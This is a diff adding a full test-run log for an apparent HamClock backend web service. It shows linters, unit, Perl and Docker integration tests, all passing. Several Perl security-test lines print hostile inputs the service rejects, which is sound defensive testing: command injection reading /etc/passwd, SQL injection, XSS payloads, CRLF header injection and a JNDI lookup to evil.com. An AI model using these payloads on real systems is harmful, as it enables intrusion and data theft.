@@ -1,0 +1,362 @@
+$  make -C tests test-all
+==> ShellCheck...
+  ShellCheck done ✓
+==> Ruff (Python)...
+  Ruff done ✓
+==> Hadolint (Dockerfile)...
+  Hadolint done ✓
+==> Perlcritic (Perl)...
+  perlcritic not installed — skipping (install: cpanm Perl::Critic)
+==> All linters passed ✓
+==> Running bats tests...
+test_crontab.bats
+ ✓ Crontab file exists
+ ✓ No lock files in /tmp
+ ✓ PATH puts system directories before venv
+ ✓ All cron log files go to /opt/hamclock-backend/logs
+test_lib_sizes.bats
+ ✓ lib_sizes.sh loads OHB_SIZES from a valid config file
+ ✓ lib_sizes.sh handles missing config gracefully
+ ✓ lib_sizes.sh rejects code injection in config
+ ✓ lib_sizes.sh rejects backtick injection in config values
+test_lighttpd_config.bats
+ ✓ Security headers config exists
+ ✓ X-Frame-Options is configured
+ ✓ X-Content-Type-Options is configured
+ ✓ Content-Security-Policy is configured
+ ✓ Referrer-Policy is configured
+ ✓ Strict-Transport-Security is configured
+ ✓ Permissions-Policy is configured
+ ✓ server.tag does not leak lighttpd version
+ ✓ No wildcard CORS in security headers
+ ✓ CGI responses disable caching
+ ✓ No lighttpd config files enable mod_ssi
+test_manage_docker.bats
+ ✓ manage-ohb-docker.sh exists
+ ✓ manage-ohb-docker.sh has set -e
+ ✓ manage-ohb-docker.sh usage() lists expected subcommands
+ ✓ manage-ohb-docker.sh contains no hardcoded secrets
+ ✓ manage-ohb-docker.sh YAML template contains image field
+ ✓ manage-ohb-docker.sh YAML template contains ports field
+ ✓ manage-ohb-docker.sh YAML template contains volumes field
+ ✓ manage-ohb-docker.sh defines a default HTTP port
+ ✓ Docker run.sh entrypoint exists
+test_shell_safety.bats
+ ✓ All shell scripts pass ShellCheck (severity: warning)
+ ✓ All shell scripts have set -euo pipefail or set -e
+ ✓ Privileged scripts use #!/bin/bash, not #!/usr/bin/env bash
+ ✓ No flock files in /tmp (use application dirs instead)
+ ✓ No bash backtick subshells (use $() instead)
+ ✓ All curl calls use -f or --fail flag
+ ✓ .env.example exists
+ ✓ .env.example contains no real secrets
+ ✓ .env is in .gitignore
+
+37 tests, 0 failures
+
+  Bash tests done ✓
+==> Running pytest...
+=================================================================================== test session starts ===================================================================================
+platform darwin -- Python 3.10.11, pytest-7.3.1, pluggy-1.0.0 -- /opt/homebrew/anaconda3/bin/python
+cachedir: .pytest_cache
+rootdir: /Users/solidus/Repository/openhamclockfork
+configfile: pyproject.toml
+plugins: anyio-4.9.0, Faker-24.0.0
+collected 64 items
+
+tests/python/test_data_scripts.py::TestBzSimple::test_script_exists PASSED                                                                                                          [  1%]
+tests/python/test_data_scripts.py::TestBzSimple::test_imports_without_error PASSED                                                                                                  [  3%]
+tests/python/test_data_scripts.py::TestBzSimple::test_iso_to_epoch_known_value PASSED                                                                                               [  4%]
+tests/python/test_data_scripts.py::TestBzSimple::test_iso_to_epoch_with_fractional_seconds PASSED                                                                                   [  6%]
+tests/python/test_data_scripts.py::TestBzSimple::test_iso_to_epoch_midnight_boundary PASSED                                                                                         [  7%]
+tests/python/test_data_scripts.py::TestBzSimple::test_iso_to_epoch_malformed_raises PASSED                                                                                          [  9%]
+tests/python/test_data_scripts.py::TestBzSimple::test_iso_to_epoch_missing_fractional_raises PASSED                                                                                 [ 10%]
+tests/python/test_data_scripts.py::TestDstSimple::test_script_exists PASSED                                                                                                         [ 12%]
+tests/python/test_data_scripts.py::TestDstSimple::test_parse_int_token_valid PASSED                                                                                                 [ 14%]
+tests/python/test_data_scripts.py::TestDstSimple::test_parse_int_token_invalid PASSED                                                                                               [ 15%]
+tests/python/test_data_scripts.py::TestDstSimple::test_parse_dst_line_fixed_valid PASSED                                                                                            [ 17%]
+tests/python/test_data_scripts.py::TestDstSimple::test_parse_dst_line_fixed_filler_9999 PASSED                                                                                      [ 18%]
+tests/python/test_data_scripts.py::TestDstSimple::test_parse_dst_line_fixed_packed_filler PASSED                                                                                    [ 20%]
+tests/python/test_data_scripts.py::TestDstSimple::test_parse_dst_line_fixed_not_dst PASSED                                                                                          [ 21%]
+tests/python/test_data_scripts.py::TestDstSimple::test_prev_month PASSED                                                                                                            [ 23%]
+tests/python/test_data_scripts.py::TestDstSimple::test_prev_month_january PASSED                                                                                                    [ 25%]
+tests/python/test_data_scripts.py::TestDstSimple::test_build_presentmonth_url PASSED                                                                                                [ 26%]
+tests/python/test_data_scripts.py::TestDstSimple::test_merge_rows_deduplicates PASSED                                                                                               [ 28%]
+tests/python/test_data_scripts.py::TestDstSimple::test_format_line PASSED                                                                                                           [ 29%]
+tests/python/test_data_scripts.py::TestFluxSimple::test_script_exists PASSED                                                                                                        [ 31%]
+tests/python/test_data_scripts.py::TestFluxSimple::test_parse_wwv_flux_valid PASSED                                                                                                 [ 32%]
+tests/python/test_data_scripts.py::TestFluxSimple::test_parse_wwv_flux_multiline PASSED                                                                                             [ 34%]
+tests/python/test_data_scripts.py::TestFluxSimple::test_parse_wwv_flux_missing_raises PASSED                                                                                        [ 35%]
+tests/python/test_data_scripts.py::TestFluxSimple::test_build_phase3_bridge PASSED                                                                                                  [ 37%]
+tests/python/test_data_scripts.py::TestFluxSimple::test_expand_tripled PASSED                                                                                                       [ 39%]
+tests/python/test_data_scripts.py::TestFluxSimple::test_expand_tripled_preserves_count PASSED                                                                                       [ 40%]
+tests/python/test_data_scripts.py::TestFluxSimple::test_parse_dsd_fluxes_valid PASSED                                                                                               [ 42%]
+tests/python/test_data_scripts.py::TestFluxSimple::test_parse_dsd_fluxes_skips_comments PASSED                                                                                      [ 43%]
+tests/python/test_data_scripts.py::TestFluxSimple::test_parse_dsd_fluxes_too_few_rows_raises PASSED                                                                                 [ 45%]
+tests/python/test_data_scripts.py::TestHcBmp::test_script_exists PASSED                                                                                                             [ 46%]
+tests/python/test_data_scripts.py::TestHcBmp::test_bmp_header_structure PASSED                                                                                                      [ 48%]
+tests/python/test_data_scripts.py::TestHcRawToBmp565::test_script_exists PASSED                                                                                                     [ 50%]
+tests/python/test_data_scripts.py::TestHcRawToBmp565::test_rgb_to_565_conversion PASSED                                                                                             [ 51%]
+tests/python/test_data_scripts.py::TestHcRawToBmp565::test_white_conversion PASSED                                                                                                  [ 53%]
+tests/python/test_rss_fetch.py::TestAtomicCacheWrite::test_write_cache_creates_file PASSED                                                                                          [ 54%]
+tests/python/test_rss_fetch.py::TestAtomicCacheWrite::test_write_cache_empty_lines_skipped PASSED                                                                                   [ 56%]
+tests/python/test_rss_fetch.py::TestAtomicCacheWrite::test_write_cache_atomic_no_partial PASSED                                                                                     [ 57%]
+tests/python/test_rss_fetch.py::TestEncodingHandling::test_utf8_to_iso8859_conversion PASSED                                                                                        [ 59%]
+tests/python/test_rss_fetch.py::TestWriteCacheOverwrite::test_overwrite_replaces_content PASSED                                                                                     [ 60%]
+tests/python/test_rss_fetch.py::TestFetchArnewslineMocked::test_fetch_arnewsline_parses_bullets PASSED                                                                              [ 62%]
+tests/python/test_rss_fetch.py::TestFetchArnewslineMocked::test_fetch_arnewsline_empty_feed_raises PASSED                                                                           [ 64%]
+tests/python/test_rss_fetch.py::TestFetchHamweeklyMocked::test_fetch_hamweekly_parses_titles PASSED                                                                                 [ 65%]
+tests/python/test_rss_fetch.py::TestFetchHTTPErrorHandling::test_http_500_raises PASSED                                                                                             [ 67%]
+tests/python/test_voacap.py::TestArgumentParsing::test_missing_required_args_fails PASSED                                                                                           [ 68%]
+tests/python/test_voacap.py::TestArgumentParsing::test_invalid_month_rejected PASSED                                                                                                [ 70%]
+tests/python/test_voacap.py::TestArgumentParsing::test_invalid_utc_rejected PASSED                                                                                                  [ 71%]
+tests/python/test_voacap.py::TestBandCorrectionMath::test_apply_band_correction_imports PASSED                                                                                      [ 73%]
+tests/python/test_voacap.py::TestBandCorrectionMath::test_apply_band_correction_zeros PASSED                                                                                        [ 75%]
+tests/python/test_voacap.py::TestBandCorrectionMath::test_apply_band_correction_output_range PASSED                                                                                 [ 76%]
+tests/python/test_voacap.py::TestModeResolution::test_mode_label_known PASSED                                                                                                       [ 78%]
+tests/python/test_voacap.py::TestModeResolution::test_mode_label_unknown PASSED                                                                                                     [ 79%]
+tests/python/test_voacap.py::TestSafeFloat::test_safe_float_none PASSED                                                                                                             [ 81%]
+tests/python/test_voacap.py::TestSafeFloat::test_safe_float_normal PASSED                                                                                                           [ 82%]
+tests/python/test_voacap.py::TestSafeFloat::test_safe_float_string PASSED                                                                                                           [ 84%]
+tests/python/test_voacap.py::TestSafeFloat::test_safe_float_empty_string PASSED                                                                                                     [ 85%]
+tests/python/test_voacap.py::TestSafeFloat::test_safe_float_whitespace PASSED                                                                                                       [ 87%]
+tests/python/test_voacap.py::TestSafeFloat::test_safe_float_negative PASSED                                                                                                         [ 89%]
+tests/python/test_voacap.py::TestBandCorrectionEdgeCases::test_all_ones_clamped PASSED                                                                                              [ 90%]
+tests/python/test_voacap.py::TestBandCorrectionEdgeCases::test_negative_inputs_clamped PASSED                                                                                       [ 92%]
+tests/python/test_voacap.py::TestBandCorrectionEdgeCases::test_large_inputs_clamped PASSED                                                                                          [ 93%]
+tests/python/test_voacap.py::TestAllModeLabels::test_all_known_modes PASSED                                                                                                         [ 95%]
+tests/python/test_voacap.py::TestVoacapOutputFormat::test_output_has_26_lines PASSED                                                                                                [ 96%]
+tests/python/test_voacap.py::TestVoacapOutputFormat::test_header_is_csv PASSED                                                                                                      [ 98%]
+tests/python/test_voacap.py::TestVoacapOutputFormat::test_all_24_hours_present PASSED                                                                                               [100%]
+
+=================================================================================== 64 passed in 1.06s ====================================================================================
+  Python tests done ✓
+==> Running prove (Perl tests)...
+tests/perl/cgi_input_validation.t ..
+ok 1 - FN31 is valid 4-char Maidenhead
+ok 2 - FN31PR is valid 6-char Maidenhead
+ok 3 - AA00 is valid
+ok 4 - RR99XX is valid (boundary)
+ok 5 - Empty string rejected
+ok 6 - ZZ99 invalid (Z > R)
+ok 7 - 8-char grid rejected
+ok 8 - Lowercase rejected (must UC first)
+ok 9 - 3-char rejected
+ok 10 - 5-char rejected
+ok 11 - SQL injection rejected
+ok 12 - SQL drop rejected
+ok 13 - Wildcard rejected
+ok 14 - W1AW is valid callsign
+ok 15 - VE3/W1AW valid (portable)
+ok 16 - W1AW-1 valid (SSID)
+ok 17 - Command injection rejected
+ok 18 - Quote injection rejected
+ok 19 - 2026 is valid year
+ok 20 - 2-digit year rejected
+ok 21 - Alpha year rejected
+ok 22 - Month 1 valid
+ok 23 - Month 12 valid
+ok 24 - Month 0 rejected
+ok 25 - Month 13 rejected
+ok 26 - 28.5 valid coordinate
+ok 27 - -81.0 valid coordinate
+ok 28 - 0 valid coordinate
+ok 29 - Command in coordinate rejected
+ok 30 - Path traversal in coordinate rejected
+ok 31 - Allowed file accepted
+ok 32 - Cron log accepted
+ok 33 - Path traversal rejected
+ok 34 - Absolute path rejected
+ok 35 - Command injection rejected
+ok 36 - Empty string rejected
+ok 37 - Normal maxage passes through
+ok 38 - Below minimum clamped to 60
+ok 39 - Huge value clamped to 86400
+ok 40 - Non-numeric defaults to 900
+ok 41 - Injection stripped, numeric kept
+1..41
+ok
+tests/perl/fetchBandConditions.t ...
+ok 1 - Valid params produce no errors
+ok 2 - Boundary values are valid
+ok 3 - Zero coordinates valid
+ok 4 - All params missing = 7 errors
+ok 5 - Only year = 6 missing
+ok 6 - Alphabetic params all rejected
+ok 7 - Month 0 rejected
+ok 8 - Month 13 rejected
+ok 9 - UTC 24 rejected
+ok 10 - Command injection in YEAR rejected
+ok 11 - Path traversal in TXLAT rejected
+1..11
+ok
+tests/perl/security_regression.t ...
+ok 1 - tail.pl rejects path traversal: '../../../etc/passwd'
+ok 2 - tail.pl rejects path traversal: '..%2F..%2F..%2Fetc%2Fpasswd'
+ok 3 - tail.pl rejects path traversal: '/etc/shadow'
+ok 4 - tail.pl rejects path traversal: 'lighttpd_error; cat /etc/passwd'
+ok 5 - tail.pl rejects path traversal: 'lighttpd_error|cat /etc/passwd'
+ok 6 - tail.pl rejects path traversal: 'lighttpd_error`cat /etc/passwd`'
+ok 7 - tail.pl rejects path traversal: '....//....//....//etc/passwd'
+ok 8 - tail.pl rejects path traversal: 'lighttpd_error%00.txt'
+ok 9 - V-003: status.pl: file not present (OK for unit test env)
+ok 10 - V-004: metrics.pl: file not present (OK for unit test env)
+ok 11 - V-051: SQL injection blocked: 'FN30' OR '1'='1'
+ok 12 - V-051: SQL injection blocked: 'FN30'; DROP TABLE wspr.rx; --'
+ok 13 - V-051: SQL injection blocked: 'FN30' UNION SELECT * FROM information_schema.tables--'
+ok 14 - V-051: SQL injection blocked: 'FN30%' AND 1=1--'
+ok 15 - V-051: SQL injection blocked: '' OR 1=1--'
+ok 16 - V-051: SQL injection blocked: 'FN30'
+ok 17 - V-051: SQL injection blocked: 'FN30\'
+ok 18 - V-051: FN30 still valid after hardening
+ok 19 - V-051: FN30PR still valid after hardening
+ok 20 - V-029: XSS HTML tags neutralized in: '<script>alert(1)</script>'
+ok 21 - V-029: XSS HTML tags neutralized in: '"><img src=x onerror=alert(1)>'
+ok 22 - V-029: XSS HTML tags neutralized in: '';alert(String.fromCharCode(88,83,83))//'
+ok 23 - V-029: XSS HTML tags neutralized in: '<svg/onload=alert(1)>'
+ok 24 - V-052: SSRF coordinate blocked: '28.5/../../../alerts'
+ok 25 - V-052: SSRF coordinate blocked: '28.5%0d%0aHost:evil.com'
+ok 26 - V-052: SSRF coordinate blocked: '28.5 AND 1=1'
+ok 27 - V-052: SSRF coordinate blocked: '${jndi:ldap://evil.com/a}'
+ok 28 - V-052: SSRF coordinate blocked: '28.5\r\nX-Injected: true'
+ok 29 - V-052: SSRF coordinate blocked: 'http://evil.com'
+ok 30 - V-052: 28.5 valid coord
+ok 31 - V-052: -81.123 valid coord
+ok 32 - V-052: 0 valid coord
+ok 33 - V-054: version.pl not present (OK for unit test env)
+1..33
+ok
+All tests successful.
+Files=3, Tests=85,  0 wallclock secs ( 0.01 usr  0.01 sys +  0.07 cusr  0.01 csys =  0.10 CPU)
+Result: PASS
+  Perl tests done ✓
+==> Running Docker tests...
+==> Docker Image Build Tests
+
+--- Building image via docker/build-image.sh ---
+NOTE: Not currently on a tag. Using 'latest'.
+
+WARNING: there are local edits. If you didn't intend that, stash
+         them and build again.
+
+Building image for 'komacke/open-hamclock-backend:latest'
+[+] Building 15.1s (16/16) FINISHED                                                                                                                                   docker:desktop-linux
+ => [internal] load build definition from Dockerfile                                                                                                                                  0.0s
+ => => transferring dockerfile: 4.00kB                                                                                                                                                0.0s
+ => [internal] load metadata for dhi.io/debian-base:trixie-debian13-dev                                                                                                               1.2s
+ => [auth] debian-base:pull token for dhi.io                                                                                                                                          0.0s
+ => [build-voacap 1/5] FROM dhi.io/debian-base:trixie-debian13-dev@sha256:2166e2eaef0651c9ad21de6ab5a34fda12541d89bccf7bcb0a94afceb1b1541b                                            0.0s
+ => => resolve dhi.io/debian-base:trixie-debian13-dev@sha256:2166e2eaef0651c9ad21de6ab5a34fda12541d89bccf7bcb0a94afceb1b1541b                                                         0.0s
+ => [internal] load build context                                                                                                                                                     0.0s
+ => => transferring context: 2.41MB                                                                                                                                                   0.0s
+ => CACHED [build-voacap 2/5] WORKDIR /opt                                                                                                                                            0.0s
+ => CACHED [stage-1 3/8] COPY docker/package-list.txt /opt                                                                                                                            0.0s
+ => CACHED [stage-1 4/8] RUN apt-get update &&     grep -v '^#' package-list.txt | xargs -r apt-get install -y --no-install-recommends &&     apt-get clean &&     rm -rf /var/lib/a  0.0s
+ => [stage-1 5/8] COPY . /opt/hamclock-backend/                                                                                                                                       0.1s
+ => CACHED [build-voacap 3/5] COPY docker/package-list-voacap.txt /opt                                                                                                                0.0s
+ => CACHED [build-voacap 4/5] COPY docker/dvoacap.tgz /opt                                                                                                                            0.0s
+ => CACHED [build-voacap 5/5] RUN apt-get update &&     grep -v '^#' package-list-voacap.txt | xargs -r apt-get install -y --no-install-recommends &&     apt-get clean &&     rm -r  0.0s
+ => [stage-1 6/8] COPY --from=build-voacap /usr/local/lib/python3.13/dist-packages/ /usr/local/lib/python3.13/dist-packages/                                                          0.0s
+ => [stage-1 7/8] WORKDIR /opt/hamclock-backend                                                                                                                                       0.0s
+ => [stage-1 8/8] RUN mkdir -p     tmp     logs     cache     data     htdocs &&     mv  docker/run.sh /opt &&     sed -i 's|^VENV=.*|VENV=/usr|' scripts/crontab &&     awk '/^[0-9  0.4s
+ => exporting to image                                                                                                                                                               13.2s
+ => => exporting layers                                                                                                                                                               1.7s
+ => => exporting manifest sha256:4b4d7e867852e5c79b9fb50b5d800baa1ab305877ccb24ececd9d7134f864369                                                                                     0.0s
+ => => exporting config sha256:207b6aa6a574040ede281f384db07f170a52d52eb0ed5b127b6870e83a3acc1b                                                                                       0.0s
+ => => exporting attestation manifest sha256:9a472eda70be2069ac8ce1d1d807302d78612a982b54e7fec586d1e7e76930a4                                                                         0.0s
+ => => exporting manifest list sha256:2e00c6835ebe35b80e12712fec9fa89528741bf0d15054eef58ef3db09a23ab0                                                                                0.0s
+ => => naming to docker.io/komacke/open-hamclock-backend:latest                                                                                                                       0.0s
+ => => unpacking to docker.io/komacke/open-hamclock-backend:latest                                                                                                                   11.5s
+
+Completed building 'komacke/open-hamclock-backend:latest'.
+  ✓ Image builds successfully via build-image.sh
+  (Ignored failures)
+  Docker tests done ✓
+==> Starting test container...
+[+] up 2/2
+ ✔ Network ohb                     Created                                                                                                                                             0.0s
+ ✔ Container open-hamclock-backend Healthy                                                                                                                                             5.9s
+==> Running integration tests against http://localhost:8085...
+=================================================================================== test session starts ===================================================================================
+platform darwin -- Python 3.10.11, pytest-7.3.1, pluggy-1.0.0 -- /opt/homebrew/anaconda3/bin/python
+cachedir: .pytest_cache
+rootdir: /Users/solidus/Repository/openhamclockfork
+configfile: pyproject.toml
+plugins: anyio-4.9.0, Faker-24.0.0
+collected 65 items
+
+tests/integration/test_endpoints.py::TestVersionEndpoint::test_version_returns_200 PASSED                                                                                           [  1%]
+tests/integration/test_endpoints.py::TestVersionEndpoint::test_version_content_type PASSED                                                                                          [  3%]
+tests/integration/test_endpoints.py::TestVersionEndpoint::test_version_contains_number PASSED                                                                                       [  4%]
+tests/integration/test_endpoints.py::TestDashboardEndpoints::test_status_returns_html PASSED                                                                                        [  6%]
+tests/integration/test_endpoints.py::TestDashboardEndpoints::test_metrics_returns_html PASSED                                                                                       [  7%]
+tests/integration/test_endpoints.py::TestDashboardEndpoints::test_heartbeat_returns_html PASSED                                                                                     [  9%]
+tests/integration/test_endpoints.py::TestDashboardEndpoints::test_jobs_returns_html PASSED                                                                                          [ 10%]
+tests/integration/test_endpoints.py::TestDashboardEndpoints::test_index_returns_200 PASSED                                                                                          [ 12%]
+tests/integration/test_endpoints.py::TestBandConditionsEndpoint::test_valid_request_returns_csv PASSED                                                                              [ 13%]
+tests/integration/test_endpoints.py::TestBandConditionsEndpoint::test_missing_params_returns_400 PASSED                                                                             [ 15%]
+tests/integration/test_endpoints.py::TestFetchWSPREndpoint::test_valid_grid_request PASSED                                                                                          [ 16%]
+tests/integration/test_endpoints.py::TestFetchWSPREndpoint::test_sql_injection_blocked PASSED                                                                                       [ 18%]
+tests/integration/test_endpoints.py::TestTailEndpoint::test_valid_file_returns_200 PASSED                                                                                           [ 20%]
+tests/integration/test_endpoints.py::TestTailEndpoint::test_path_traversal_blocked PASSED                                                                                           [ 21%]
+tests/integration/test_endpoints.py::TestTailEndpoint::test_command_injection_blocked PASSED                                                                                        [ 23%]
+tests/integration/test_endpoints.py::TestErrorHandling::test_404_does_not_leak_paths PASSED                                                                                         [ 24%]
+tests/integration/test_endpoints.py::TestErrorHandling::test_invalid_cgi_does_not_crash PASSED                                                                                      [ 26%]
+tests/integration/test_endpoints.py::TestErrorHandling::test_uri_too_long_dos_prevention PASSED                                                                                     [ 27%]
+tests/integration/test_endpoints.py::TestDirectoryListing::test_ham_directory_listing_disabled PASSED                                                                               [ 29%]
+tests/integration/test_endpoints.py::TestHTTPMethods::test_trace_method_blocked PASSED                                                                                              [ 30%]
+tests/integration/test_endpoints.py::TestHTTPMethods::test_put_method_blocked PASSED                                                                                                [ 32%]
+tests/integration/test_endpoints.py::TestAdvancedInjection::test_advanced_command_injection PASSED                                                                                  [ 33%]
+tests/integration/test_endpoints.py::TestAdvancedInjection::test_reflected_xss_prevention PASSED                                                                                    [ 35%]
+tests/integration/test_endpoints.py::TestAdvancedInjection::test_lfi_encoded_path_traversal PASSED                                                                                  [ 36%]
+tests/integration/test_endpoints.py::TestNullByteInjection::test_null_byte_in_tail_file_param PASSED                                                                                [ 38%]
+tests/integration/test_endpoints.py::TestNullByteInjection::test_null_byte_in_path PASSED                                                                                           [ 40%]
+tests/integration/test_endpoints.py::TestDoubleEncoding::test_double_encoded_path_traversal PASSED                                                                                  [ 41%]
+tests/integration/test_endpoints.py::TestHTTPResponseSplitting::test_crlf_injection_in_param PASSED                                                                                 [ 43%]
+tests/integration/test_endpoints.py::TestHostHeaderInjection::test_spoofed_host_header PASSED                                                                                       [ 44%]
+tests/integration/test_endpoints.py::TestErrorPageInfoLeak::test_500_does_not_leak_stack_trace PASSED                                                                               [ 46%]
+tests/integration/test_endpoints.py::TestErrorPageInfoLeak::test_error_pages_no_server_internals PASSED                                                                             [ 47%]
+tests/integration/test_endpoints.py::TestHTTPVersionEnforcement::test_http10_request_works PASSED                                                                                   [ 49%]
+tests/integration/test_endpoints.py::TestCGIStderrLeakage::test_band_conditions_no_perl_warnings PASSED                                                                             [ 50%]
+tests/integration/test_endpoints.py::TestStaticFileAccess::test_dotfile_access_blocked PASSED                                                                                       [ 52%]
+tests/integration/test_endpoints.py::TestStaticFileAccess::test_git_directory_blocked PASSED                                                                                        [ 53%]
+tests/integration/test_endpoints.py::TestStaticFileAccess::test_backup_file_blocked PASSED                                                                                          [ 55%]
+tests/integration/test_endpoints.py::TestHTTPOptionsDisclosure::test_options_no_dangerous_methods PASSED                                                                            [ 56%]
+tests/integration/test_endpoints.py::TestHTTPOptionsDisclosure::test_options_on_cgi PASSED                                                                                          [ 58%]
+tests/integration/test_endpoints.py::TestParameterPollution::test_duplicate_params_band_conditions PASSED                                                                           [ 60%]
+tests/integration/test_endpoints.py::TestOpenRedirectPrevention::test_no_redirect_to_external PASSED                                                                                [ 61%]
+tests/integration/test_endpoints.py::TestOpenRedirectPrevention::test_encoded_redirect_blocked PASSED                                                                               [ 63%]
+tests/integration/test_endpoints.py::TestUnicodeNormalization::test_unicode_dot_dot_traversal PASSED                                                                                [ 64%]
+tests/integration/test_endpoints.py::TestLargePostBody::test_large_post_rejected PASSED                                                                                             [ 66%]
+tests/integration/test_endpoints.py::TestHEADConsistency::test_head_matches_get_status PASSED                                                                                       [ 67%]
+tests/integration/test_endpoints.py::TestHEADConsistency::test_head_has_content_length PASSED                                                                                       [ 69%]
+tests/integration/test_endpoints.py::TestMultipleHostHeaders::test_conflicting_host_headers PASSED                                                                                  [ 70%]
+tests/integration/test_endpoints.py::TestContentTypeEnforcement::test_version_returns_text_plain PASSED                                                                             [ 72%]
+tests/integration/test_endpoints.py::TestContentTypeEnforcement::test_status_returns_text_html PASSED                                                                               [ 73%]
+tests/integration/test_endpoints.py::TestETagInfoLeak::test_etag_no_inode_leak PASSED                                                                                               [ 75%]
+tests/integration/test_endpoints.py::TestSSIInjection::test_ssi_in_query_param PASSED                                                                                               [ 76%]
+tests/integration/test_endpoints.py::TestSemicolonPathDelimiter::test_semicolon_path_bypass PASSED                                                                                  [ 78%]
+tests/integration/test_endpoints.py::TestMethodOverrideHeader::test_method_override_blocked PASSED                                                                                  [ 80%]
+tests/integration/test_endpoints.py::TestWebSocketUpgrade::test_websocket_upgrade_rejected PASSED                                                                                   [ 81%]
+tests/integration/test_endpoints.py::TestAbsoluteURIRequest::test_absolute_uri_no_proxy PASSED                                                                                      [ 83%]
+tests/integration/test_security_headers.py::TestSecurityHeaders::test_x_frame_options PASSED                                                                                        [ 84%]
+tests/integration/test_security_headers.py::TestSecurityHeaders::test_x_content_type_options PASSED                                                                                 [ 86%]
+tests/integration/test_security_headers.py::TestSecurityHeaders::test_content_security_policy PASSED                                                                                [ 87%]
+tests/integration/test_security_headers.py::TestSecurityHeaders::test_no_server_version_leak PASSED                                                                                 [ 89%]
+tests/integration/test_security_headers.py::TestSecurityHeaders::test_referrer_policy PASSED                                                                                        [ 90%]
+tests/integration/test_security_headers.py::TestSecurityHeaders::test_strict_transport_security PASSED                                                                              [ 92%]
+tests/integration/test_security_headers.py::TestSecurityHeaders::test_permissions_policy PASSED                                                                                     [ 93%]
+tests/integration/test_security_headers.py::TestSecurityHeaders::test_cache_control_on_cgi PASSED                                                                                   [ 95%]
+tests/integration/test_security_headers.py::TestCORSHeaders::test_no_wildcard_cors PASSED                                                                                           [ 96%]
+tests/integration/test_security_headers.py::TestCORSHeaders::test_cgi_no_cors PASSED                                                                                                [ 98%]
+tests/integration/test_security_headers.py::TestHTTPS::test_no_mixed_content_in_html PASSED                                                                                         [100%]
+
+=================================================================================== 65 passed in 4.22s ====================================================================================
+[+] down 2/2
+ ✔ Container open-hamclock-backend Removed                                                                                                                                             1.3s
+ ✔ Network ohb                     Removed                                                                                                                                             0.3s
+  Integration tests done ✓
+
+════════════════════════════════════════════
+  All tests passed ✓
+════════════════════════════════════════════
